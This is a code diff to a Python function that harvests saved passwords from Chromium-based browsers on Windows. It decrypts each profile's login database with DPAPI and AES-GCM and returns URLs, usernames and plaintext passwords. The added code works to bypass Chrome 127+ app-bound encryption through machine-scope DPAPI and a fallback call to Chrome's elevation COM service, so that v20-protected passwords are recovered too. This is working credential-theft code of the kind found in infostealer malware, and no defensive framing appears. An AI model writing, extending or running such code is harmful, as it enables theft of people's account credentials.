@@ -519,7 +519,8 @@ def get_browser_passwords():
                 from Crypto.Cipher import AES
             except ImportError:
                 return "(pycryptodome not installed)"
-        if enc[:3] in (b"v10", b"v11"):
+        # v10, v11, v20 all use AES-256-GCM with the same byte layout
+        if enc[:3] in (b"v10", b"v11", b"v20"):
             iv, payload, tag = enc[3:15], enc[15:-16], enc[-16:]
             try:
                 return AES.new(key, AES.MODE_GCM, nonce=iv).decrypt_and_verify(payload, tag).decode(errors="replace")
@@ -527,19 +528,45 @@ def get_browser_passwords():
                 return ""
         return ""
 
-    def _dpapi_decrypt(data):
+    def _dpapi_decrypt(data, flags=0):
         class _BLOB(ctypes.Structure):
             _fields_ = [("cbData", ctypes.c_uint), ("pbData", ctypes.POINTER(ctypes.c_byte))]
         raw = (ctypes.c_byte * len(data))(*data)
         b_in = _BLOB(len(data), raw)
         b_out = _BLOB()
         ok = ctypes.windll.crypt32.CryptUnprotectData(
-            ctypes.byref(b_in), None, None, None, None, 0, ctypes.byref(b_out))
+            ctypes.byref(b_in), None, None, None, None, flags, ctypes.byref(b_out))
         if ok:
             result = bytes(ctypes.string_at(b_out.pbData, b_out.cbData))
             ctypes.windll.kernel32.LocalFree(b_out.pbData)
             return result
         return b""
+
+    def _get_appbound_key(local_state_data):
+        """Decrypt Chrome 127+ app-bound encrypted key.
+        Chrome's IElevator COM service encrypts the key with machine-scope DPAPI.
+        We try that first; fall back to the COM service via pythoncom if available.
+        """
+        raw = _b64.b64decode(local_state_data.get("os_crypt", {}).get("app_bound_encrypted_key", ""))
+        if not raw:
+            return None
+        # Skip 1-byte type prefix, remainder is DPAPI with CRYPTPROTECT_LOCAL_MACHINE (0x04)
+        CRYPTPROTECT_LOCAL_MACHINE = 0x04
+        key = _dpapi_decrypt(raw[1:], CRYPTPROTECT_LOCAL_MACHINE)
+        if key and len(key) >= 32:
+            return key[-32:]   # last 32 bytes are the AES-256 key
+        # Try COM fallback (requires pywin32 and Chrome elevation service running)
+        try:
+            import pythoncom, win32com.client  # type: ignore
+            pythoncom.CoInitialize()
+            CLSID = "{708860E0-F641-4611-8895-7D867DD3675B}"
+            svc = win32com.client.Dispatch(CLSID)
+            decrypted = svc.DecryptData(raw)
+            if decrypted and len(decrypted) >= 32:
+                return decrypted[-32:]
+        except Exception:
+            pass
+        return None
 
     local = os.environ.get("LOCALAPPDATA", "")
     roaming = os.environ.get("APPDATA", "")
@@ -558,13 +585,16 @@ def get_browser_passwords():
     for browser, base_path in browsers.items():
         if not os.path.isdir(base_path):
             continue
-        aes_key = None
+        aes_key = None        # v10/v11 key
+        aes_key_v20 = None    # v20 / Chrome 127+ key
         try:
             ls_path = os.path.join(base_path, "Local State")
             if os.path.isfile(ls_path):
                 with open(ls_path, "r", encoding="utf-8") as f:
-                    enc_key = _b64.b64decode(_json.load(f)["os_crypt"]["encrypted_key"])[5:]
+                    ls_data = _json.load(f)
+                enc_key = _b64.b64decode(ls_data["os_crypt"]["encrypted_key"])[5:]
                 aes_key = _dpapi_decrypt(enc_key)
+                aes_key_v20 = _get_appbound_key(ls_data)
         except Exception:
             pass
         for profile_dir in os.listdir(base_path):
@@ -578,14 +608,20 @@ def get_browser_passwords():
                 for url, user, enc_pwd in conn.execute("SELECT origin_url,username_value,password_value FROM logins"):
                     pwd = ""
                     if enc_pwd:
-                        if not aes_key:
-                            pwd = "(encrypted)"
-                        elif enc_pwd[:3] == b"v20":
-                            # Chrome 127+ App-Bound Encryption — cannot decrypt without Chrome service
-                            pwd = "(app-bound encrypted)"
+                        prefix = enc_pwd[:3]
+                        if prefix == b"v20":
+                            if aes_key_v20:
+                                pwd = _aes_decrypt(enc_pwd, aes_key_v20) or "(decrypt failed)"
+                            else:
+                                pwd = "(app-bound encrypted — Chrome 127+)"
+                        elif prefix in (b"v10", b"v11"):
+                            if aes_key:
+                                pwd = _aes_decrypt(enc_pwd, aes_key) or "(decrypt failed)"
+                            else:
+                                pwd = "(encrypted)"
                         else:
-                            pwd = _aes_decrypt(enc_pwd, aes_key) or "(decrypt failed)"
-                    if url or user:   # include even if password empty/undecryptable
+                            pwd = "(unknown format)"
+                    if url or user:
                         results.append({"browser": browser, "profile": profile_dir,
                                          "url": url, "username": user, "password": pwd})
                 conn.close()
